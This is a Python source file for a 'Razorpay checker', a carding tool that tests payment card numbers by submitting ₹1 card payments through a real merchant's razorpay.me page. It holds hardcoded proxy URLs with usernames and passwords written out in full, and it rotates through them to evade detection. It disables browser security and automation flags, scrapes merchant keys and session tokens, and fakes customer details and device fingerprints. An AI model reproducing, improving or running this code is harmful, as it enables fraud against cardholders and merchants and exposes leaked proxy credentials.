# ============================================================
#   RAZORPAY CHECKER v5.3
#   Proper 1-by-1 proxy rotation + cached merchant data
#   Fixed: pg_router response → authentication_failed
#   Fixed: Session token fetch - 3 methods with robust extraction
# ============================================================

import asyncio
import requests
import json
import time
import random
import re
import string
import logging
import platform
import threading
from multiprocessing import Process, Queue
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode, urlparse, parse_qs

try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# ==================== HARDCODED PROXIES ====================
PROXY_LIST = [
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ph-man.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@co-bog.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cl-san.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@rs-bel.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pl-tor.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@gr-ath.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@lt-sia.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cz-pra.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ee-tal.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pt-lis.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080",
    "http://qpsiwsym:1d7x54ucvl3x@31.59.20.176:6754",
    "http://qpsiwsym:1d7x54ucvl3x@23.95.150.145:6114",
    "http://qpsiwsym:1d7x54ucvl3x@198.23.239.134:6540",
    "http://qpsiwsym:1d7x54ucvl3x@45.38.107.97:6014",
    "http://qpsiwsym:1d7x54ucvl3x@107.172.163.27:6543",
    "http://qpsiwsym:1d7x54ucvl3x@198.105.121.200:6462",
    "http://qpsiwsym:1d7x54ucvl3x@216.10.27.159:6837",
    "http://qpsiwsym:1d7x54ucvl3x@142.111.67.146:5611",
    "http://qpsiwsym:1d7x54ucvl3x@191.96.254.138:6185",
    "http://qpsiwsym:1d7x54ucvl3x@31.58.9.4:6077",
    "http://g10701005:j0i2m2@proxy.ttu.edu.tw:3128",
    "http://spuqbkih:m0x2v6ozxa21@31.59.20.176:6754",
    "http://spuqbkih:m0x2v6ozxa21@23.95.150.145:6114",
    "http://spuqbkih:m0x2v6ozxa21@198.23.239.134:6540",
    "http://spuqbkih:m0x2v6ozxa21@45.38.107.97:6014",
    "http://spuqbkih:m0x2v6ozxa21@107.172.163.27:6543",
    "http://spuqbkih:m0x2v6ozxa21@198.105.121.200:6462",
    "http://spuqbkih:m0x2v6ozxa21@216.10.27.159:6837",
    "http://spuqbkih:m0x2v6ozxa21@142.111.67.146:5611",
    "http://spuqbkih:m0x2v6ozxa21@191.96.254.138:6185",
    "http://spuqbkih:m0x2v6ozxa21@31.58.9.4:6077"
]

HARDCODED_SITE = "https://razorpay.me/@thepunjabistore"
#HARDCODED_SITE = "https://razorpay.me/@hotelparasinternationaldelhi"
HARDCODED_AMOUNT_PAISE = 100  # ₹1
TDS_WAIT_SECONDS = 10
PROCESS_TIMEOUT = 90

# ==================== CACHED MERCHANT DATA ====================
_cached_merchant_data = None
_merchant_data_lock = None
_merchant_data_expiry = 0
MERCHANT_DATA_TTL = 300  # 5 minutes

# ==================== PROXY ROTATION STATE ====================
_proxy_index = 0
_proxy_async_lock = None
_proxy_thread_lock = threading.Lock()
_total_proxy_rotations = 0

# ==================== EXECUTOR ====================
_executor = None


def _get_executor():
    global _executor
    if _executor is None:
        _executor = ThreadPoolExecutor(max_workers=4)
    return _executor


def _sanitize_telegram(text):
    if not isinstance(text, str):
        return str(text)
    return text.replace('<', '').replace('>', '')


# ==================== PG_ROUTER RESPONSE DETECTION ====================

def _is_pg_router_response(data):
    if not isinstance(data, dict):
        return False
    amount = data.get("amount", "")
    notif_url = data.get("notificationUrl", "")
    if not isinstance(amount, str) or not isinstance(notif_url, str):
        return False
    has_rupee = "\u20b9" in amount or "₹" in amount
    has_pg_router = "pg_router/v1/payments" in notif_url
    return has_rupee and has_pg_router


def _auth_failed_response():
    return {
        "description": "Your payment could not be completed due to incorrect OTP or verification details. Try another payment method or contact your bank for details.",
        "reason": "authentication_failed"
    }


# ==================== PROXY FUNCTIONS ====================

def _parse_proxy_string(proxy_string):
    clean = proxy_string.replace('https://', '').replace('http://', '')
    if '@' not in clean:
        return None
    credentials, host_port = clean.split('@', 1)
    if ':' not in credentials or ':' not in host_port:
        return None
    user, pw = credentials.split(':', 1)
    ip, port = host_port.rsplit(':', 1)
    if not all([user, pw, ip, port]):
        return None
    return {
        'ip': ip,
        'port': port,
        'user': user,
        'password': pw,
        'proxy_reqs': {
            'http': f'http://{user}:{pw}@{ip}:{port}',
            'https': f'http://{user}:{pw}@{ip}:{port}'
        },
        'proxy_playwright': {
            'server': f'http://{ip}:{port}',
            'username': user,
            'password': pw
        }
    }


async def _get_next_proxy():
    global _proxy_index, _proxy_async_lock, _total_proxy_rotations
    if _proxy_async_lock is None:
        _proxy_async_lock = asyncio.Lock()
    async with _proxy_async_lock:
        proxy_str = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
        proxy_num = (_proxy_index % len(PROXY_LIST)) + 1
        _proxy_index += 1
        _total_proxy_rotations += 1
        if _total_proxy_rotations % 50 == 1:
            logging.info(f"[Razorpay] Proxy rotation: using proxy #{proxy_num}/{len(PROXY_LIST)} (total rotations: {_total_proxy_rotations})")
    return proxy_str


def _get_proxy_at_index(index):
    return PROXY_LIST[index % len(PROXY_LIST)]


def _get_random_proxy():
    """Get a random proxy for fallback token fetching."""
    return PROXY_LIST[random.randint(0, len(PROXY_LIST) - 1)]


# ==================== SESSION TOKEN - METHOD 1: HTTP ONLY ====================

def _extract_token_from_url(url):
    """Extract session_token from any URL string."""
    if not url:
        return None
    try:
        token = parse_qs(urlparse(url).query).get("session_token", [None])[0]
        if token and len(token) > 10:
            return token
    except:
        pass
    return None


def _extract_token_from_text(text):
    """Extract session_token from HTML/JS text using regex."""
    if not text:
        return None
    # Pattern 1: session_token=xxx or session_token":"xxx" or session_token': 'xxx'
    patterns = [
        r'session_token["\s:=]+([a-zA-Z0-9_-]{20,})',
        r'session_token=([a-zA-Z0-9_-]{20,})',
        r'"session_token"\s*:\s*"([^"]{20,})"',
        r"'session_token'\s*:\s*'([^']{20,})'",
    ]
    for pat in patterns:
        m = re.search(pat, text)
        if m:
            return m.group(1)
    return None


def _get_session_token_http_only(proxy_reqs):
    """Get session token with HTTP requests only - robust version."""
    urls_to_try = [
        "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1",
        "https://api.razorpay.com/v1/checkout/public?new_session=true",
        "https://api.razorpay.com/v1/checkout/public?traffic_env=production",
    ]
    
    for url in urls_to_try:
        try:
            s = requests.Session()
            if proxy_reqs:
                s.proxies.update(proxy_reqs)
            s.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
            })
            
            resp = s.get(url, timeout=15, allow_redirects=True)
            
            # Check final URL
            token = _extract_token_from_url(resp.url)
            if token:
                return token, None
            
            # Check ALL redirect history URLs (each 302 Location header)
            if resp.history:
                for r in resp.history:
                    # Check Location header
                    loc = r.headers.get('Location', '')
                    token = _extract_token_from_url(loc)
                    if token:
                        return token, None
                    # Also check the response URL of each redirect step
                    token = _extract_token_from_url(r.url)
                    if token:
                        return token, None
            
            # Check response body for token
            token = _extract_token_from_text(resp.text)
            if token:
                return token, None
            
            # Try JSON response
            try:
                data = resp.json()
                token = data.get("session_token")
                if token and len(str(token)) > 10:
                    return str(token), None
            except:
                pass
            
        except Exception as e:
            continue
    
    return None, "HTTP-only failed"


# ==================== SESSION TOKEN - METHOD 2: PLAYWRIGHT ====================

def _get_session_token_with_playwright(proxy_data):
    """Get session token with Playwright - tracks all redirects."""
    if not PLAYWRIGHT_AVAILABLE:
        return None, "Playwright not installed"
    
    proxy_config = proxy_data['proxy_playwright']
    
    for attempt in range(3):
        all_urls = []
        browser = None
        
        try:
            with sync_playwright() as p:
                browser_args = [
                    '--no-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                    '--disable-blink-features=AutomationControlled'
                ]
                if platform.system() == 'Linux':
                    browser_args.extend(['--disable-gpu', '--disable-software-rasterizer'])
                
                browser = p.chromium.launch(
                    headless=True,
                    proxy=proxy_config,
                    args=browser_args,
                    timeout=20000
                )
                
                context = browser.new_context(
                    ignore_https_errors=True,
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                )
                page = context.new_page()
                
                # Track ALL request URLs to catch redirects
                def on_request(request):
                    all_urls.append(request.url)
                
                # Track ALL response URLs
                def on_response(response):
                    all_urls.append(response.url)
                
                page.on("request", on_request)
                page.on("response", on_response)
                
                start_url = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1"
                
                try:
                    page.goto(start_url, timeout=15000, wait_until='commit')
                except Exception as nav_err:
                    # Navigation error is OK - redirects might have already happened
                    pass
                
                # Wait for redirects to settle
                try:
                    page.wait_for_timeout(4000)
                except:
                    pass
                
                # Check current page URL
                try:
                    current_url = page.url
                    token = _extract_token_from_url(current_url)
                    if token:
                        try:
                            browser.close()
                        except:
                            pass
                        return token, None
                except:
                    pass
                
                # Check ALL captured URLs
                for captured_url in all_urls:
                    token = _extract_token_from_url(captured_url)
                    if token:
                        try:
                            browser.close()
                        except:
                            pass
                        return token, None
                
                # Try extracting from page content via JS
                try:
                    js_result = page.evaluate("""() => {
                        // From URL params
                        const params = new URLSearchParams(window.location.search);
                        const fromUrl = params.get('session_token');
                        if (fromUrl) return fromUrl;
                        
                        // From window object
                        if (window.session_token) return window.session_token;
                        if (window.__session_token) return window.__session_token;
                        
                        // From Razorpay checkout object
                        if (window.Razorpay && window.Razorpay.session_token) return window.Razorpay.session_token;
                        
                        // From data attributes
                        const el = document.querySelector('[data-session-token]');
                        if (el) return el.getAttribute('data-session-token');
                        
                        // From meta tags
                        const meta = document.querySelector('meta[name="session-token"]');
                        if (meta) return meta.getAttribute('content');
                        
                        // Search in page scripts
                        const scripts = document.querySelectorAll('script');
                        for (const s of scripts) {
                            const txt = s.textContent || '';
                            const m = txt.match(/session_token["\\s:=]+([a-zA-Z0-9_-]{20,})/);
                            if (m) return m[1];
                            const m2 = txt.match(/session_token=([a-zA-Z0-9_-]{20,})/);
                            if (m2) return m2[1];
                        }
                        
                        return null;
                    }""")
                    if js_result and len(str(js_result)) > 10:
                        try:
                            browser.close()
                        except:
                            pass
                        return str(js_result), None
                except:
                    pass
                
                try:
                    browser.close()
                except:
                    pass
                    
        except Exception as e:
            try:
                if browser:
                    browser.close()
            except:
                pass
            continue
    
    return None, "Playwright failed"


# ==================== SESSION TOKEN - METHOD 3: FROM PAYMENT PAGE ====================

def _get_session_token_from_payment_page(proxy_data):
    """Extract session token by visiting the actual payment page."""
    if not PLAYWRIGHT_AVAILABLE:
        return None, "Playwright not installed"
    
    proxy_config = proxy_data['proxy_playwright']
    site_url = HARDCODED_SITE
    
    try:
        with sync_playwright() as p:
            browser_args = [
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-blink-features=AutomationControlled'
            ]
            if platform.system() == 'Linux':
                browser_args.extend(['--disable-gpu', '--disable-software-rasterizer'])
            
            browser = p.chromium.launch(
                headless=True,
                proxy=proxy_config,
                args=browser_args,
                timeout=20000
            )
            
            context = browser.new_context(
                ignore_https_errors=True,
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            )
            page = context.new_page()
            
            all_urls = []
            def on_request(request):
                all_urls.append(request.url)
            def on_response(response):
                all_urls.append(response.url)
            page.on("request", on_request)
            page.on("response", on_response)
            
            try:
                page.goto(site_url, timeout=15000, wait_until='domcontentloaded')
                page.wait_for_timeout(3000)
            except:
                pass
            
            # Check current URL
            token = _extract_token_from_url(page.url)
            if token:
                browser.close()
                return token, None
            
            # Check all captured URLs
            for u in all_urls:
                token = _extract_token_from_url(u)
                if token:
                    browser.close()
                    return token, None
            
            # Extract from page JS
            try:
                js_result = page.evaluate("""() => {
                    const params = new URLSearchParams(window.location.search);
                    const fromUrl = params.get('session_token');
                    if (fromUrl) return fromUrl;
                    
                    // Check all iframes
                    const iframes = document.querySelectorAll('iframe');
                    for (const iframe of iframes) {
                        try {
                            const src = iframe.src || iframe.getAttribute('src') || '';
                            const m = src.match(/session_token=([a-zA-Z0-9_-]{20,})/);
                            if (m) return m[1];
                        } catch(e) {}
                    }
                    
                    // Search scripts
                    const scripts = document.querySelectorAll('script');
                    for (const s of scripts) {
                        const txt = s.textContent || '';
                        const m = txt.match(/session_token["\\s:=]+([a-zA-Z0-9_-]{20,})/);
                        if (m) return m[1];
                        const m2 = txt.match(/session_token=([a-zA-Z0-9_-]{20,})/);
                        if (m2) return m2[1];
                    }
                    
                    return null;
                }""")
                if js_result and len(str(js_result)) > 10:
                    browser.close()
                    return str(js_result), None
            except:
                pass
            
            browser.close()
            
    except Exception as e:
        pass
    
    return None, "Payment page method failed"


# ==================== SESSION TOKEN - MASTER FUNCTION ====================

def _get_session_token_robust(proxy_data, proxy_reqs):
    """
    Try all 3 methods to get session token.
    Falls back to random proxy if current one fails.
    """
    # Method 1: HTTP only (fastest)
    token, err = _get_session_token_http_only(proxy_reqs)
    if token:
        return token, None
    
    # Method 2: Playwright direct endpoint
    token, err = _get_session_token_with_playwright(proxy_data)
    if token:
        return token, None
    
    # Method 3: From payment page
    token, err = _get_session_token_from_payment_page(proxy_data)
    if token:
        return token, None
    
    # Fallback: Try with a DIFFERENT random proxy (up to 2 tries)
    for fallback_attempt in range(2):
        fallback_proxy_str = _get_random_proxy()
        fallback_data = _parse_proxy_string(fallback_proxy_str)
        if not fallback_data:
            continue
        
        logging.info(f"[Razorpay] Token fetch fallback attempt {fallback_attempt+1} with different proxy")
        
        # HTTP with fallback proxy
        token, err = _get_session_token_http_only(fallback_data['proxy_reqs'])
        if token:
            return token, None
        
        # Playwright with fallback proxy
        token, err = _get_session_token_with_playwright(fallback_data)
        if token:
            return token, None
    
    return None, "All token methods failed"


# ==================== MERCHANT DATA EXTRACTION ====================

def _parse_merchant_api_response(api_data):
    """Parse merchant API response and extract required fields."""
    if not isinstance(api_data, dict):
        return None, None, None, None
    kh = api_data.get('keyless_header')
    kid = api_data.get('key_id')
    plid = api_data.get('id')
    ppi_list = api_data.get('payment_page_items', [])
    ppi = ppi_list[0].get('id') if ppi_list else None
    if kh and kid and plid and ppi:
        return kh, kid, plid, ppi
    pl = api_data.get('payment_link')
    if isinstance(pl, str):
        try:
            pl = json.loads(pl)
        except:
            pl = None
    if isinstance(pl, dict):
        plid = plid or pl.get('id')
        ppi_list2 = pl.get('payment_page_items', [])
        ppi = ppi or (ppi_list2[0].get('id') if ppi_list2 else None)
    if kh and kid and plid and ppi:
        return kh, kid, plid, ppi
    return None, None, None, None


def _deep_search_json(obj, target_keys, depth=0, max_depth=8):
    """Recursively search nested dict/list for a dict containing all target_keys."""
    if depth > max_depth:
        return None
    if isinstance(obj, dict):
        if all(obj.get(k) for k in target_keys):
            return obj
        for v in obj.values():
            result = _deep_search_json(v, target_keys, depth + 1, max_depth)
            if result:
                return result
    elif isinstance(obj, list):
        for item in obj:
            result = _deep_search_json(item, target_keys, depth + 1, max_depth)
            if result:
                return result
    return None


def _extract_merchant_from_html(html, merchant_handle):
    """
    Parse merchant data from razorpay.me page HTML.
    The page is Next.js and embeds all data in <script id="__NEXT_DATA__">.
    """
    if not html:
        return None, None, None, None

    # Method 1: Next.js __NEXT_DATA__ (most reliable for razorpay.me)
    next_data_match = re.search(r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>', html, re.DOTALL)
    if next_data_match:
        try:
            next_data = json.loads(next_data_match.group(1))
            # Search recursively for keyless_header + key_id + id + payment_page_items
            candidate = _deep_search_json(next_data, ['keyless_header', 'key_id'])
            if candidate:
                kh = candidate.get('keyless_header')
                kid = candidate.get('key_id')
                kh, kid, plid, ppi = _parse_merchant_api_response(candidate)
                if kh and kid and plid and ppi:
                    logging.info("[Razorpay] Extracted merchant data from __NEXT_DATA__")
                    return kh, kid, plid, ppi
        except Exception as e:
            logging.warning(f"[Razorpay] __NEXT_DATA__ parse error: {e}")

    # Method 2: Scan all inline JSON blobs in <script> tags
    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
    for block in script_blocks:
        if 'keyless_header' not in block and 'key_id' not in block:
            continue
        # Try to find and parse JSON objects within the script block
        json_candidates = re.findall(r'\{[^<]{50,}\}', block)
        for candidate_str in json_candidates:
            try:
                candidate = json.loads(candidate_str)
                kh, kid, plid, ppi = _parse_merchant_api_response(candidate)
                if kh and kid and plid and ppi:
                    logging.info("[Razorpay] Extracted merchant data from inline script JSON")
                    return kh, kid, plid, ppi
            except:
                pass

    # Method 3: Regex extract individual fields from the entire HTML
    try:
        kh = None
        kid = None
        plid = None
        ppi = None

        kh_m = re.search(r'"keyless_header"\s*:\s*"([^"]{20,})"', html)
        if kh_m:
            kh = kh_m.group(1)
        kid_m = re.search(r'"key_id"\s*:\s*"(rzp_(?:live|test)_[^"]{10,})"', html)
        if kid_m:
            kid = kid_m.group(1)
        plid_m = re.search(r'"id"\s*:\s*"(pl_[^"]{10,})"', html)
        if plid_m:
            plid = plid_m.group(1)
        ppi_m = re.search(r'"id"\s*:\s*"(ppi_[^"]{10,})"', html)
        if ppi_m:
            ppi = ppi_m.group(1)

        if kh and kid and plid and ppi:
            logging.info("[Razorpay] Extracted merchant data via field regex")
            return kh, kid, plid, ppi
    except Exception as e:
        logging.warning(f"[Razorpay] Field regex extraction error: {e}")

    return None, None, None, None


def _extract_merchant_via_page_fetch(merchant_handle, site_url, proxy_reqs=None, timeout=15):
    """
    Fetch the razorpay.me page HTML and extract merchant data.
    This is the primary method since the page is server-side rendered (Next.js)
    and embeds all necessary data in __NEXT_DATA__.
    """
    if not merchant_handle:
        return None, None, None, None, "No merchant handle"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Upgrade-Insecure-Requests": "1",
    }

    try:
        s = requests.Session()
        if proxy_reqs:
            s.proxies.update(proxy_reqs)
        resp = s.get(site_url, headers=headers, timeout=timeout, allow_redirects=True)
        logging.info(f"[Razorpay] Page fetch status: {resp.status_code} ({len(resp.text)} chars)")

        if resp.status_code == 200:
            kh, kid, plid, ppi = _extract_merchant_from_html(resp.text, merchant_handle)
            if kh and kid and plid and ppi:
                return kh, kid, plid, ppi, None
            else:
                # Log a snippet to help debug what the page actually returned
                snippet = resp.text[:500].replace('\n', ' ')
                logging.warning(f"[Razorpay] Page fetched but couldn't extract fields. Page snippet: {snippet}")
                return None, None, None, None, "Fields not found in page HTML"
        else:
            logging.warning(f"[Razorpay] Page fetch returned {resp.status_code}")
            return None, None, None, None, f"Page HTTP {resp.status_code}"
    except Exception as e:
        logging.warning(f"[Razorpay] Page fetch exception: {e}")
        return None, None, None, None, f"Page fetch error: {e}"


def _extract_merchant_via_playwright(merchant_handle, site_url, proxy_data):
    """Fallback method: Playwright browser with response interception."""
    global PLAYWRIGHT_AVAILABLE
    if not PLAYWRIGHT_AVAILABLE:
        return None, None, None, None, "Playwright not installed"
    proxy_config = proxy_data['proxy_playwright']
    proxy_reqs = proxy_data['proxy_reqs']
    intercepted = {}

    try:
        with sync_playwright() as p:
            browser_args = [
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-web-security',
                '--disable-blink-features=AutomationControlled'
            ]
            if platform.system() == 'Linux':
                browser_args.extend(['--disable-gpu', '--disable-software-rasterizer'])

            browser = p.chromium.launch(
                headless=True,
                proxy=proxy_config,
                args=browser_args,
                timeout=20000
            )
            context = browser.new_context(
                ignore_https_errors=True,
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            )
            page = context.new_page()

            def on_resp(r):
                try:
                    if "api.razorpay.com" in r.url and r.status == 200:
                        body = r.json()
                        if body and isinstance(body, dict):
                            kh, kid, plid, ppi = _parse_merchant_api_response(body)
                            if kh and kid and plid and ppi:
                                intercepted['data'] = body
                                logging.info(f"[Razorpay] Intercepted valid merchant data from: {r.url}")
                except:
                    pass

            page.on("response", on_resp)

            try:
                page.goto(site_url, timeout=15000, wait_until='domcontentloaded')
                page.wait_for_timeout(3000)
            except Exception as nav_err:
                logging.warning(f"[Razorpay] Playwright nav error (non-fatal): {nav_err}")

            if intercepted.get('data'):
                kh, kid, plid, ppi = _parse_merchant_api_response(intercepted['data'])
                try:
                    browser.close()
                except:
                    pass
                if kh and kid and plid and ppi:
                    return kh, kid, plid, ppi, None

            # Try extracting from rendered page HTML
            try:
                html = page.content()
                kh, kid, plid, ppi = _extract_merchant_from_html(html, merchant_handle)
                if kh and kid and plid and ppi:
                    try:
                        browser.close()
                    except:
                        pass
                    return kh, kid, plid, ppi, None
            except Exception as html_err:
                logging.warning(f"[Razorpay] Playwright HTML extract error: {html_err}")

            try:
                browser.close()
            except:
                pass

    except Exception as e:
        err_str = str(e)
        if "libatk" in err_str or "shared libraries" in err_str or "cannot open shared object" in err_str:
            logging.error("[Razorpay] Playwright system dependencies missing (libatk etc) - Playwright disabled")
            PLAYWRIGHT_AVAILABLE = False
        else:
            logging.warning(f"[Razorpay] Playwright merchant extraction failed: {err_str[:200]}")

    return None, None, None, None, "Playwright merchant extraction failed"


def _extract_merchant_data_with_proxy(proxy_data):
    site_url = HARDCODED_SITE
    proxy_reqs = proxy_data['proxy_reqs']

    merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)
    merchant_handle = merchant_match.group(1) if merchant_match else None

    # PRIMARY: Fetch the razorpay.me page HTML directly and parse __NEXT_DATA__
    # This works without any browser - the page is server-side rendered
    kh, kid, plid, ppi, err = _extract_merchant_via_page_fetch(merchant_handle, site_url, proxy_reqs)
    if kh and kid and plid and ppi:
        return kh, kid, plid, ppi, None

    # SECONDARY: Try page fetch without proxy (proxies may be blocking)
    if proxy_reqs:
        logging.warning(f"[Razorpay] Proxy page fetch failed ({err}), trying direct (no proxy)...")
        kh, kid, plid, ppi, err = _extract_merchant_via_page_fetch(merchant_handle, site_url, proxy_reqs=None)
        if kh and kid and plid and ppi:
            return kh, kid, plid, ppi, None

    # TERTIARY: Playwright browser (if available and system deps present)
    if PLAYWRIGHT_AVAILABLE:
        logging.warning(f"[Razorpay] Page fetch failed ({err}), trying Playwright...")
        kh, kid, plid, ppi, err = _extract_merchant_via_playwright(merchant_handle, site_url, proxy_data)
        if kh and kid and plid and ppi:
            return kh, kid, plid, ppi, None

    return None, None, None, None, "Merchant extraction failed"


# ==================== ASYNC MERCHANT DATA CACHE ====================

async def _ensure_merchant_data():
    global _cached_merchant_data, _merchant_data_lock, _merchant_data_expiry
    
    now = time.time()
    if _cached_merchant_data and now < _merchant_data_expiry:
        return _cached_merchant_data
    
    if _merchant_data_lock is None:
        _merchant_data_lock = asyncio.Lock()
    
    async with _merchant_data_lock:
        now = time.time()
        if _cached_merchant_data and now < _merchant_data_expiry:
            return _cached_merchant_data
        
        logging.info("[Razorpay] Extracting merchant data (cached miss)...")

        MAX_ATTEMPTS = 5
        proxy_step = max(1, len(PROXY_LIST) // MAX_ATTEMPTS)

        for attempt in range(MAX_ATTEMPTS):
            proxy_string = _get_proxy_at_index(_proxy_index + attempt * proxy_step)
            proxy_data = _parse_proxy_string(proxy_string)
            if not proxy_data:
                continue

            logging.info(f"[Razorpay] Merchant fetch attempt {attempt+1}/{MAX_ATTEMPTS} using proxy {proxy_data['ip']}")

            try:
                loop = asyncio.get_running_loop()
                kh, kid, plid, ppiid, err = await loop.run_in_executor(
                    _get_executor(),
                    _extract_merchant_data_with_proxy,
                    proxy_data
                )

                if not err and kh and kid and plid and ppiid:
                    _cached_merchant_data = {
                        'kh': kh, 'kid': kid, 'plid': plid, 'ppiid': ppiid
                    }
                    _merchant_data_expiry = now + MERCHANT_DATA_TTL
                    logging.info(f"[Razorpay] Merchant data cached successfully on attempt {attempt+1}")
                    return _cached_merchant_data
                else:
                    logging.warning(f"[Razorpay] Merchant attempt {attempt+1} failed: {err}")
            except Exception as e:
                logging.error(f"[Razorpay] Merchant attempt {attempt+1} exception: {e}")

        if _cached_merchant_data:
            logging.warning("[Razorpay] Using stale merchant cache")
            _merchant_data_expiry = now + 60
            return _cached_merchant_data

        raise Exception(f"Failed to extract merchant data after {MAX_ATTEMPTS} attempts")


def _invalidate_merchant_cache():
    global _cached_merchant_data, _merchant_data_expiry
    _cached_merchant_data = None
    _merchant_data_expiry = 0


# ==================== PAYMENT FUNCTIONS ====================

def _random_user_info():
    return {
        "name": "Test User",
        "email": f"testuser{random.randint(100, 999)}@gmail.com",
        "phone": f"9876543{random.randint(100, 999)}"
    }


def _create_order(session, payment_link_id, amount_paise, payment_page_item_id):
    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Origin": "https://razorpay.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }
    payload = {
        "notes": {"comment": ""},
        "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]
    }
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=8)
        if resp.status_code in [400, 401, 403, 404]:
            return "API_ERROR"
        resp.raise_for_status()
        return resp.json().get("order", {}).get("id")
    except requests.exceptions.RequestException:
        return None


def _submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url):
    card_number, exp_month, exp_year, cvv = card_info
    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
    params = {
        "key_id": key_id,
        "session_token": session_token,
        "keyless_header": keyless_header
    }
    headers = {
        "x-session-token": session_token,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Origin": "https://razorpay.com",
        "Referer": site_url,
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }
    data = {
        "notes[comment]": "",
        "payment_link_id": payment_link_id,
        "key_id": key_id,
        "contact": f"+91{user_info['phone']}",
        "email": user_info["email"],
        "currency": "INR",
        "_[library]": "checkoutjs",
        "_[platform]": "browser",
        "_[referer]": site_url,
        "amount": amount_paise,
        "order_id": order_id,
        "device_fingerprint[fingerprint_payload]": ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(128)),
        "method": "card",
        "card[number]": card_number,
        "card[cvv]": cvv,
        "card[name]": user_info["name"],
        "card[expiry_month]": exp_month,
        "card[expiry_year]": exp_year,
        "save": "0"
    }
    try:
        return session.post(url, headers=headers, params=params, data=urlencode(data), timeout=8)
    except requests.exceptions.RequestException:
        return None


